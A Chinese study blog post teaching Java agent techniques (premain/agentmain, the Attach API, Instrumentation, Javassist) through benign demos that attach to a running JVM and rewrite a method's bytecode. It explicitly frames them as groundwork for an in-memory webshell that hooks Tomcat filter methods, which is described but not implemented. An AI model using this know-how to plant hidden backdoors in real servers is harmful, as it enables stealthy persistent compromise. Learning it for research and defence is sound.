本文学习自 boogipop 师傅和 drunkbaby 师傅的文章
## 1.什么是 javaAgent？
**Agent，意为“代理”**
java 是一种静态强类型的语言，在运行之前必须将其编译成.class 字节码，然后交给 JVM 去处理运行。java Agent 就是一种能够在不影响正常编译的前提下，修改 java 字节码，进行动态修改已加载或者未加载的类，属性和方法的技术
平常我们见到的一些技术，比如热加载，或者 RASP 都是基于 Agent 工具实现的，它具体是怎么实现的呢？

有两种形式
一种是在 JVM 启动前就加载 premain-Agent，另一种是 JVM 启动之后加载 agentmain-Agent，这里我们可以将其功能理解为一种特殊 Interceptor  （拦截器）
**Premain-Agent**
![PreAgent.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/36078896/1705990843458-83a08530-567a-4173-89bc-9e8193e2592b.jpeg#averageHue=%23f9f9f9&clientId=ua6718e02-a329-4&from=paste&height=215&id=u7d2fb3c1&originHeight=322&originWidth=1742&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=29182&status=done&style=none&taskId=u20685936-e08f-445c-9713-ae78767af47&title=&width=1161.3333333333333)

**agentmain-Agent**
![agentmain-Agent.jpg](https://cdn.nlark.com/yuque/0/2024/jpeg/36078896/1705990852067-3b4192bb-91ed-41af-94c9-c9d2771f135c.jpeg#averageHue=%23fbfbfb&clientId=ua6718e02-a329-4&from=paste&height=415&id=u93b2e673&originHeight=622&originWidth=1382&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32466&status=done&style=none&taskId=uda67e32e-241d-43af-a2ec-8246fe2131c&title=&width=921.3333333333334)

我们可以通过两个例子来看看 agentmain-Agent 和premain-Agent 到底是如何发挥作用的
## premain-Agent
首先我们必须实现`premain-Agent`类，也就是我们要决定 agent 处理的内容和逻辑，同时我们 jar 文件的清单（mainfest）中必须要包含 Premain-Class 属性
然后我们可以在命令行使用 -javaagent 来实现启动时的加载

具体的实现如下，创建的premain-Agent类必须要实现 premian 方法
```java
package com.example.echoshell.agents;

import java.lang.instrument.Instrumentation;

public class Java_Agent_premain {
    public static void premain(String args, Instrumentation inst) {
        for (int i =0 ; i<10 ; i++){
            System.out.println("调用了premain-Agent！");
        }
    }
}

```
然后就是写一个主类，待会运行主类的时候用以测试
```java
package org.example;

public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello world!");
    }
}
```
之后就是将 premain-agent  类打包为 jar 包了，这里源自 drunkbaby 师傅的文章会有两种方法，一种是直接 jar 命令来进行打包，一种是用 maven 来进行，推荐使用 maven，因为我自己用 jar 命令去打没打成。。
我们在 pom 文件中加上如下内容
```xml

<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-assembly-plugin</artifactId>
      <version>2.6</version>
      <configuration>
        <descriptorRefs>
          <descriptorRef>jar-with-dependencies</descriptorRef>
        </descriptorRefs>
        <archive>
          <manifestFile>
            src/main/resources/META-INF/MANIFEST.MF
          </manifestFile>
        </archive>
      </configuration>
    </plugin>
  </plugins>
</build>
```
然后运行 maven 的 assembly:assembly 命令打包（该命令是自定义打包，会识别 MF 文件，package 则不会）
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1705996869963-eb93d807-2430-476f-8b18-3b0e359cc092.png#averageHue=%232e3746&clientId=ua6718e02-a329-4&from=paste&height=404&id=uea841312&originHeight=606&originWidth=1587&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=381792&status=done&style=none&taskId=uac0d498f-498d-405f-b7d5-dbe5502bc5c&title=&width=1058)
打包成功之后呢，我们会得到如下两个 jar 包，第二个是我们需要的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1705996904627-ffa0c452-e376-44cf-aee6-135dafaa5b2c.png#averageHue=%23494135&clientId=ua6718e02-a329-4&from=paste&height=63&id=u9bcd21b3&originHeight=94&originWidth=591&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=45319&status=done&style=none&taskId=ue70896c7-0ee0-4745-94c1-c72e65c802e&title=&width=394)
之后就是配置 vm-option 选项了，这里经典的坑，我也是看两位大师傅的文章才缓过来
打开运行那块的 Edit Configurations 选项，然后添加一个 Application，由于 VM-option 选项在新版的 ideaUI 中被隐藏起来了，我们选择 Modify options 中的 add VM options 即可重新设置 VMoption
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1705997087781-42c30fc3-ed32-4f55-a8cd-c1469901de7f.png#averageHue=%232c3035&clientId=ua6718e02-a329-4&from=paste&height=835&id=u242d7086&originHeight=1253&originWidth=1904&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=410788&status=done&style=none&taskId=u03acbaf3-3a61-4044-82d6-8d6c70add34&title=&width=1269.3333333333333)
然后这个 vm-option 的制定路径就是我们刚才生成的 jar 中的第二个，记得前面带上`-javaagent`参数，之后配置主类的路径即可
运行主类：
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1705997320485-10a292aa-402a-450f-9fbb-5f85e37cd739.png#averageHue=%232b3036&clientId=ua6718e02-a329-4&from=paste&height=237&id=u86f754ee&originHeight=355&originWidth=872&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=205945&status=done&style=none&taskId=ub8f1ba40-2e54-47a0-a103-3cc2f95a429&title=&width=581.3333333333334)
以上就是 Premain-Agent 的工作实例
需要理解一点，我们刚才对于添加新的 application 的做法中，设置了启动主类，以及对应的 vm-option，也就是说，当我们指定运行这个 application 的时候，其实是在 vm-option 指定为我们刚才打包好的 jar 包，然后在此环境下运行 hello 主类才得到的上面的结果，而不是说直接在项目中启动主类，因为这个时候的项目其实是没有指定 agent 启动的 hello 主类的

## agentmain-Agent
premain-agent 只能在类加载前去插入，而 agentmain 可以在已经运行的 jvm 中去加载，并实现相应的修改字节码的功能

### VirtualMachine类
` com.sun.tools.attach.VirtualMachine`类可以实现获取 JVM 信息，内存 dump，现成 dump，类信息统计等功能
该类允许我们通过给 attach 方法传入一个 JVM 的 PID，来远程连接到该 JVM 上，之后我们就可以对连接的 JVM 进行各种操作，如注入 agent
下面是一些该类的主要方法
```java
//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()

//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()

//获得当前所有的JVM列表
VirtualMachine.list()

//解除与特定JVM的连接
VirtualMachine.detach()
```

### VirtualMachineDescriptor类
` com.sun.tools.attach.VirtualMachineDescriptor`类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息，如何 PID，虚拟机名称等，下面是一个获取特定虚拟机的 PID 事例
```java
import java.util.List;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class get_PID {
    public static void main(String[] args) {
        //先获取到正常运行的JVM列表
        List<VirtualMachineDescriptor> list =VirtualMachine.list();
        //然后我们循环遍历刚才获取到的JVM列表，如果它当前为get_PID,就返回其pid
        for(VirtualMachineDescriptor vmd :list){
            if (vmd.displayName().equals("org.example.GET_PID.get_PID")){
                System.out.println(vmd.id());
            }
        }
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706159054417-bb7b9a5e-663e-4a3a-b2df-d17bba87093b.png#averageHue=%232d3e5c&clientId=u59ee69b3-79ec-4&from=paste&height=485&id=u46b1ef77&originHeight=727&originWidth=1744&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=887626&status=done&style=none&taskId=u3b6cf096-927e-4927-8e25-a749a4b5243&title=&width=1162.6666666666667)
这里有一个坑，有些找不到 tools 这个 jar 包，所以必须得自行导入
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706159114151-785383af-bec0-4559-a3af-f350e180bf70.png#averageHue=%232d2f32&clientId=u59ee69b3-79ec-4&from=paste&height=243&id=u376c33c9&originHeight=365&originWidth=1257&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=28858&status=done&style=none&taskId=ub2735ff1-4ff1-44ea-af07-9156520754d&title=&width=838)

### agentmain 注入过程详解
介绍完上面两种对 JVM 信息获取和操作的类之后我们来实现一个`agentmain-Agent`
首先写一个 Sleep_Hello 类，模拟正常运行的 JVM
```java
import static java.lang.Thread.sleep;
public class Sleep_Hello {
    public static void main(String[] args) throws Exception {
        while(true){
            System.out.println("hello world");
            sleep(5000);
        }
    }
}
```
然后写 agentmain-Agent 类
```java
import java.lang.instrument.Instrumentation;
import static java.lang.Thread.sleep;
public class Agent_Main {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        while (true){
            System.out.println("调用了agentmain-Agent!");
            sleep(3000);
        }
    }
}
```
写完开始给 agentmain-Agent 打 jar 包做成 agent
配置 agentmain.mf
```java
Manifest-Version: 1.0
Agent-Class: org.example.Agent_Main

```
打包方法是一样的，maven 插件打包
最后写一个 inject 类，用来将我们的 agent-main 注入目标 JVM
```java
import java.util.List;
import com.sun.tools.attach.*;

public class Inject_Agent {
    public static void main(String[] args) throws Exception {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if (vmd.displayName().equals("org.example.Sleep_Hello")){
                System.out.println("正在注入");
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());

                //加载Agent
                virtualMachine.loadAgent("H:\\javasecurity\\agentmainlearn\\target\\agentmainlearn-1.0-SNAPSHOT-jar-with-dependencies.jar");

                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}

```
如何进行操作？我们首先先启动 Sleep_Hello 这个程序，让他对应的 JVM 跑起来，然后运行我们的 inject_Agent 程序，把我们刚才打包好的 agent 程序注入进去。
就是同时运行两个程序的事，只不过注入的时候要多注入几次，可以先尝试把现在运行的 JVM 打印出来，找到 Sleep_Hello 这个我们的目标 JVM 之后，再准确的指定，成功率高一点，我这边有一个时刻打印了两次“调用了agentmain-Agent!”就是多尝试的时候打印出的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706161384395-caf28db1-93b0-46b9-be3c-bd029a43996e.png#averageHue=%232d3a52&clientId=u59ee69b3-79ec-4&from=paste&height=758&id=u90b69262&originHeight=1137&originWidth=2547&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1743562&status=done&style=none&taskId=ue0d49de0-2454-483f-a71e-dce9fb307d1&title=&width=1698)
效果就是，本来打印的 hello world，后来注入程序将我们的 agent 注入进去之后就开始打印 agentmain-Agent 了，并且源程序没有结束，这个现象也是很符合我们的 mmshell 的感觉

## Agentmain-Instrumentation
> ”动态修改字节码“

这个玩意我们一开始学 agent 的时候写 premainagnet 就遇到过，只不过没有细讲它
 Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。  
这也是为什么我们写 java agent 类的时候，premain 或者 agentmain 方法的参数除了 arg 那个参数数组，还必须有一个它的参数类
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706161721609-5ddb9bd5-e179-4df9-89b7-784faeafc3ab.png#averageHue=%232a2f36&clientId=u8d72d196-18f8-4&from=paste&height=30&id=u70d3f390&originHeight=45&originWidth=1403&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59970&status=done&style=none&taskId=u0d6aeaac-f1d6-44ab-9035-c571885cadd&title=&width=935.3333333333334)
它本质是一个接口
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706162973893-47e206f9-557b-4e50-9534-f544d0f32e84.png#averageHue=%23363a41&clientId=u5595a040-f3b4-4&from=paste&height=390&id=uca763f93&originHeight=585&originWidth=761&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=452663&status=done&style=none&taskId=u9679f3ee-738b-4129-9dcc-05095039396&title=&width=507.3333333333333)
重要方法的大概作用如下
```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
 
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
 
}
```
下面我们来简单实现以下获取和修改目标 JVM 已加载的类，步骤其实和 agentmain 的时候差不多，就是把我们指定的 agent 替换为Agentmain-Instrumentation 的即可

```java
import java.lang.instrument.Instrumentation;

public class JAVA_Agentmain_Instrument {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        Class [] classes=inst.getAllLoadedClasses();

        for (Class cls:classes){
            System.out.println("-----------------------");
            System.out.println("加载类: "+cls.getName());
            System.out.println("是否可以被修改: "+inst.isModifiableClass(cls));

        }
    }

}
```
然后还是用 Sleep_Hello 去实现，用 Inject 将我们的 Agentmain_Instrument 注入进去
效果图如下
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706165353064-43e75c2e-05ee-4098-a7f4-323140facc16.png#averageHue=%232c384c&clientId=u5595a040-f3b4-4&from=paste&height=777&id=u910ed04e&originHeight=1166&originWidth=2486&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1791856&status=done&style=none&taskId=u1e5663c4-c91a-4f91-9683-b0a4d791117&title=&width=1657.3333333333333)
然后我们再来介绍一下addTransformer
### addTransformer
上面对Instrumentation 这个接口做总介绍的时候提到过，它的作用就是增加一个 Class 文件的转化器，该转化器用来改变 class 二进制流的数据，其参数 canRetransform  限制其能否重新转化
在 Instrumentation 中由 addTransformer 添加的新 transformer calss 文件转换器不仅可以修改二进制流数据，而且能够对未加载的类进行拦截，同时能够对已加载的类进行重新拦截，我们之后就是根据这个特性来实现动态修改字节码的。
而我们创建的这个 transform 转换器需要实现一个接口：
`ClassFileTransformer` ，该接口里面只有一个方法，然后返回一个 byte 数组，其实就是 class 的二进制流数据
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706166068955-609b6489-616c-4ae1-a412-35e89305a3d7.png#averageHue=%232a2e34&clientId=u5595a040-f3b4-4&from=paste&height=189&id=uad7cd01e&originHeight=283&originWidth=824&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=207632&status=done&style=none&taskId=u49c6d260-4a23-4526-9f87-73f43614bf1&title=&width=549.3333333333334)
所以整个Instrumentation 作用的流程简化一下：

- 首先 Instrumentation. addTransformer()  来加载一个转换器
- 转换器的结果 （transform 方法的 return） 将成为转换后的字节码
- 针对这些字节码，没有加载的类会使用 ClassLoader.defineClass()去定义它，对于已经加载的类，会使用
- ClassLoader.redefineClass()重新定义，并配合 Instrumentation.retransformClasses  进行转化

简而言之，该方法能够让我们动态的修改已经加载和没有加载的类，达到动态修改字节码的作用
请注意：当存在多个转换器时，转换将由 transform 调用链组成，也就是说一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）

### Javassist
为什么接下来又学 javassist 呢？因为它也将作为我们对字节码操作的一大利器，不学不行
#### 使用 Javassist 创建类
java 的 class 文件都是以字节码的形式存在的，javassist 工具能够帮助我们创建字节码，修改字节码（改类的方法，属性等等），并且能够从字节码中实例化出对象，很牛逼的工具
如何使用呢？我们先导入一下依赖
```xml
<dependency>
  <groupId>org.javassist</groupId>
  <artifactId>javassist</artifactId>
  <version>3.25.0-GA</version>
</dependency>
```
然后我们直接从一个案例中学习一个用 javassist 创建 class 文件的 demo：
先看它的原始代码（其实就是把注释去掉联合起来）
```java
import javassist.*;

/**
 * @author rickiyang
 * @date 2019-08-06
 * @Desc
 */
public class javassistDemo {

    /**
     * 创建一个Person 对象
     *
     * @throws Exception
     */
    public static void createPseson() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("org.example.javassit.Person");
        CtField param = new CtField(pool.get("java.lang.String"), "name", cc);
        param.setModifiers(Modifier.PRIVATE);
        cc.addField(param, CtField.Initializer.constant("xiaoming"));
        cc.addMethod(CtNewMethod.setter("setName", param));
        cc.addMethod(CtNewMethod.getter("getName", param));
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
        cons.setBody("{name = \"xiaohong\";}");
        cc.addConstructor(cons);
        cons = new CtConstructor(new CtClass[]{pool.get("java.lang.String")}, cc);
        cons.setBody("{$0.name = $1;}");
        cc.addConstructor(cons);
        CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[]{}, cc);
        ctMethod.setModifiers(Modifier.PUBLIC);
        ctMethod.setBody("{System.out.println(name);}");
        cc.addMethod(ctMethod);
        cc.writeFile("E:\\CTFLearning\\Java\\agentdemo\\");
    }

    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
然后我们逐步分析重新写一个带有注释的案例
```java
import javassist.*;

/**
 * @author rickiyang
 * @date 2019-08-06
 * @Desc
 */
public class javassistDemo {

    /**
     * 创建一个Person 对象
     *
     * @throws Exception
     */
    public static void createPseson() throws Exception {
        //1.先创建一个类池（直译classpool），就是用来创建类的启动器
        ClassPool pool = ClassPool.getDefault();

        //2.然后用pool来指定创建一个空类Person在指定的目录下
        CtClass cc = pool.makeClass("com.stoocea.javassit.Person");

        //3.1 新增一个字段叫做name
        //3.2 并且通过setModifiers将该类的访问级别设置为private
        //3.3 然后调用addField方法，模拟一个静态代码块对name赋值为"xiaoming"
        CtField param = new CtField(pool.get("java.lang.String"), "name", cc);
        param.setModifiers(Modifier.PRIVATE);
        cc.addField(param, CtField.Initializer.constant("xiaoming"));

        //4. 添加name的set和get方法
        cc.addMethod(CtNewMethod.setter("setName", param));
        cc.addMethod(CtNewMethod.getter("getName", param));

        //5.1 通过CtConstructor来创建构造方法，这里是无参构造的部分
        //5.2 将无参构造的内容设置为name=xiaohong;
        //5.3 然后通过addConstructor方法将刚才写的构造方法添加进类
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
        cons.setBody("{name = \"xiaohong\";}");
        cc.addConstructor(cons);

        //5.4 下面其实就是有参构造部分，依然是先构造一个CtConstructor，只不过这次有参数
        //5.5 然后依然是设置方法内容，这里的$0=this $1,$2,$3,$4.....代表方法参数，也就是说我们将当前this.name=有参构造的第一个参数
        //5.6 然后继续add构造方法
        cons = new CtConstructor(new CtClass[]{pool.get("java.lang.String")}, cc);
        cons.setBody("{$0.name = $1;}");
        cc.addConstructor(cons);

        //接下来就是更为普适的方法写入了，这里的实例化作用是创建了一个名为printName的方法，无参数无返回值，输出name值
        CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[]{}, cc);
        ctMethod.setModifiers(Modifier.PUBLIC);
        ctMethod.setBody("{System.out.println(name);}");
        cc.addMethod(ctMethod);

        //然后指定写入的目录，这里要和我们刚才开始的创建CtClass对象结合着看，这里就是写入的项目路径，创建的CtClass对象中的路径就是在项目路径下的具体路径
        cc.writeFile("H:\\javasecurity\\Javassistlearn");
    }

    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
分析完毕后呢，具体的结果应该如下
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706169455331-ec153c93-14b8-465f-adb5-877e4d501796.png#averageHue=%232c3038&clientId=u5595a040-f3b4-4&from=paste&height=457&id=u55b55734&originHeight=686&originWidth=1650&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=842070&status=done&style=none&taskId=u1bb135e8-d855-4fe1-9fd4-b17afd4e28d&title=&width=1100)
#### 步骤总结
首先实例化一个 CtClass 对象，我们之后的创建 CtFiled 或者 CtMethod，CtConstructor 都是对其的补充，而 CtClass 就代表着我们要创建的那个类
这里需要注意一点，ClassPool 会在内存中维护所有被它创建过的 CtClass，所以当 CtClass 过多的时候，会占用大量的内存，API 中给出的解决方法是，有意识地调用 detach()以释放内存

**ClassPool**需要关注的方法：

1. getDefault : 返回默认的ClassPool 是单例模式的，一般通过该方法创建我们的ClassPool；
2. appendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；
3. toClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；
4. get , getCtClass : 根据类路径名获取该类的CtClass对象，用于后续的编辑。

**CtClass**需要关注的方法：

1. freeze : 冻结一个类，使其不可修改；
2. isFrozen : 判断一个类是否已被冻结；
3. prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；
4. defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；
5. detach : 将该class从ClassPool中删除；
6. writeFile : 根据CtClass生成 .class 文件；
7. toClass : 通过类加载器加载该CtClass。

上面我们创建一个新的方法使用了CtMethod类。CtMthod代表类中的某个方法，可以通过CtClass提供的API获取或者CtNewMethod新建，通过CtMethod对象可以实现对方法的修改。
**CtMethod**中的一些重要方法：

1. insertBefore : 在方法的起始位置插入代码；
2. insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；
3. insertAt : 在指定的位置插入代码；
4. setBody : 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；
5. make : 创建一个新的方法。

然后我们上面在写指定类的构造方法的时候用到了一些符号，$0 $1 $2 $3,代表是哪个参数，按照索引排序来的，$0 是代表 this

#### 调用生成的 class 文件
这里我们对上面用 javassist 生成的 class 文件进行一个方法的调用
只需在原有的创建对象的代码基础上加上后面的一些特殊调用方法即可，然后我们不写入到具体的文件了，就直接调用
```java

........
        cc.addMethod(ctMethod);
	//通过调用CtClass的toClass方法获取到指定类，然后进行实例化，之后就是通过反射调用的步骤
		Object person=cc.toClass().newInstance();
        Method setName=person.getClass().getDeclaredMethod("setName",String.class);
        setName.invoke(person,"stoocea");
        Method printName=person.getClass().getDeclaredMethod("printName");
        printName.invoke(person);


    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
效果图下
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706170701054-7478aa2e-3a1f-47a9-8c99-d3af73cd4aff.png#averageHue=%232c3036&clientId=u5595a040-f3b4-4&from=paste&height=626&id=u962312c6&originHeight=1112&originWidth=1014&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=969347&status=done&style=none&taskId=u681686a4-7c18-419c-b418-80b1ce080ea&title=&width=571)
当然还有通过.class 文件调用到我们用 javassist 写的类的方法（这两种方法就搬一下 boogipop 师傅的代码了）
```java
   ClassPool pool = ClassPool.getDefault();
// 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬
        pool.appendClassPath("E:\\CTFLearning\\Java\\agentdemo\\");
    //获取Person的class对象
        CtClass ctClass = pool.get("com.boogipop.javassit.Person");
        Object person = ctClass.toClass().newInstance();
下面就还是反射调用的步骤了
```
或者是通过 person 类来创建一个接口，然后实例化之后接着调用即可
```java
   ClassPool pool = ClassPool.getDefault();
// 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬
        pool.appendClassPath("E:\\CTFLearning\\Java\\agentdemo\\");
    //获取Person的class对象
        CtClass ctClass = pool.get("com.boogipop.javassit.Person");
        CtClass ctClassI = pool.get("com.boogipop.javassit.PersonI");
        // 使代码生成的类，实现 PersonI 接口
        ctClass.setInterfaces(new CtClass[]{ctClassI});
        PersonI person = (PersonI) ctClass.toClass().newInstance();
        person.setName("阿良良木历");
        person.printName();
```
两者的前提都是先通过 javassist 开始创建一个 person 对象

## 修改已加载类的字节码
上面铺垫了 Instrumentation 和 javassist 这么久，其实就是为了这里服务的，我们通过 Instrumentation 的 transformer 转换器获取到指定 JVM，然后指定重写这个 JVM 中类内容，重写的实现呢，自然是通过 javassist 了
再具体一点，主要是通过 addTransformer 来创建一个转换器开启动态修改字节码这个过程，然后通过 retransformClasses 来最终执行我们修改的操作（这个时候已经用 javassist 修改完目标 JVM 中的字节码了）
先准备一个目标 JVM，拿之前 agentmain 的 sleep_hello 就行
```java
import static java.lang.Thread.sleep;

public class Sleep_Hello {
    public static void main(String[] args) throws InterruptedException {
        while (true){
            System.out.println("Hello World!");
            sleep(5000);
        }
    }
}
```
再准备 AgentMain，然后打一个 jar 包
```java
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
public class JAVA_Agentmain {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        Class [] classes=inst.getAllLoadedClasses();

        for (Class cls:classes){
           if(cls.getName().equals("org.example.Sleep_Hello")){
               inst.addTransformer(new Hello_Transform(),true);
               inst.retransformClasses(cls);

           }
        }
    }

}

```
还要写上具体的 transform 方法的内容，当然我们修改字节码的关键就在这了（javassist 也是在这里进行的操作）
```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
import javassist.*;
public class Hello_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try{
            //获取CtClass对象的容器 ClassPool
            ClassPool classPool=ClassPool.getDefault();

            //添加额外的类搜索路径
            if(classBeingRedefined!=null){
                ClassClassPath ccp=new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            //通过Ct获取到我们待会要修改字节码的累
            CtClass ctClass=classPool.get("org.example.Sleep_Hello");
            System.out.println(ctClass);

            //获取目标方法
            CtMethod ctMethod= ctClass.getDeclaredMethod("hello");

            //设置方法体，也就是具体修改的修改字节码的部分
            String body ="{System.out.println(\"stoocea Hacker\");}";
            ctMethod.setBody(body);

            //返回目标类字节码
            byte[] bytes =ctClass.toBytecode();
            return bytes;

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```
 
然后就是注入 Inject 的内容了，通过他来将我们的 agentmain 注入进去
```java

import java.util.List;
import com.sun.tools.attach.*;

public class Inject_Agent {
    public static void main(String[] args) throws Exception {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if (vmd.displayName().equals("org.example.Sleep_Hello")){
                System.out.println("正在注入");
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());

                //加载Agent
                virtualMachine.loadAgent("H:\\javasecurity\\AgentInstrumentation\\target\\AgentInstrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar");

                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}

```
之后就是运行 Sleep_Hello 使他的 JVM 持续运作，然后运行 Inject，将我们的 agentmain 注入到它的 JVM 中，然后我们的 agentmain 中的内容又是通过addTransformer 来开启了一个动态加载字节码的过程，transform 又被我们重写成了用 javassist 修改 Sleep_Hello 字节码的内容
所以一旦我们注入进 agentmain，就会重写一直在运行的 Sleep_Hello 的字节码，表现为：本来一直在 hello world，然后突然现实一句 javassist，之后的内容变成了 "stoocea Hacker"了
![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706173739606-b6c8ee68-cfca-45fe-9630-c8078aecf8b5.png#averageHue=%232d3037&clientId=u5595a040-f3b4-4&from=paste&height=747&id=u97990302&originHeight=1120&originWidth=2487&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1886694&status=done&style=none&taskId=u4c1f97e3-0f7d-4c41-be18-018a3b5f24e&title=&width=1658)

## Agent 内存马实现
本文章其实主要写到现在,也是终于可以开始写 Agent 内存马了
但是这里主要的实现是通过 Springboot 来的，我个人 Springboot 还不是很熟，所以只能依葫芦画瓢，这篇 Agent 内存马之后就去补 Spring 基础了
根据 tomcat 的责任链机制，我们可以知道，每一次请求的调用栈中都会有一个反复调用`InternalDoFilter`的链`**internalDoFilter->doFilter->service**` ，也就是说 Spring 他在处理请求时会不断调用 internalFilter 方法，或者是 Dofliter 方法，是不是和我们上面的 Sleep_Hello 不断调用 helloworld 方法一样？我们既能够知道他 JVM 的具体名称，也能够通过 Javassist 去修改这两个方法的字节码内容，实现不断调用我们的改写的恶意方法的效果
而且这两个方法具有参数`**request response**`** **拿来回显也是很好的选择

